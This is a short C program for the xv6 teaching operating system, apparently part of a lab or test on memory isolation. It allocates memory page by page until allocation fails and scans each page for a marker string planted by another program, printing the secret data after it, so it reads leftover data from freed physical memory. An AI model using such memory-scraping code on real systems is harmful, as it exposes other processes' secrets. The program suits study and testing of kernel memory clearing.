#include "kernel/types.h"
#include "user/user.h"

/*
Exhaustive Memory Drain
Why it's tested: If memory is highly fragmented, 10 pages might not be
enough to hit the specific physical page secret.c used. This script 
aggressively consumes all available memory until the system runs out, 
guaranteeing it catches the secret.
*/

int main(int argc, char *argv[]) {
  char *pattern = "This may help.";
  char *page;
  
  // Keep allocating until sbrk fails (returns -1)
  while((page = sbrk(4096)) != (char*)-1) {
    for(int i = 0; i < 4096 - 64; i++) {
      if(strcmp(page + i, pattern) == 0) {
        printf("%s\n", page + i + 16);
        exit(0); // Exit immediately when found to release memory
      }
    }
  }
  
  printf("sniffer: secret not found\n");
  exit(0);
}
